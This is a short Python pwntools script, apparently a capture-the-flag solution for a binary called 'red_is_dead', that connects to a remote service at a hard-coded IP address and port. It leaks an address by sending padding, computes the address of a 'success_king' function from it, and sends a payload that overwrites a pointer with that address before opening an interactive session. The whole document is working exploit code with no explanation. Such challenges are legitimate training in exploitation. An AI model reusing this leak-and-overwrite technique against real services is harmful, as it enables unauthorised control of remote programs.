from pwn import *

#p = process("./red_is_dead")
p = remote("159.203.38.169", 5683)
print p.recv()
p.sendline("a"*8)
p.recvuntil("a"*8)
success_knight = u64(p.recvuntil(":")[:-1].ljust(8,"\x00"))
success_king = success_knight-47
log.info("success_knight = "+hex(success_knight))
log.info("success_king = "+hex(success_king))
print p.recv()
p.sendline("red"+"\x00"*13+p64(success_king))
p.interactive()
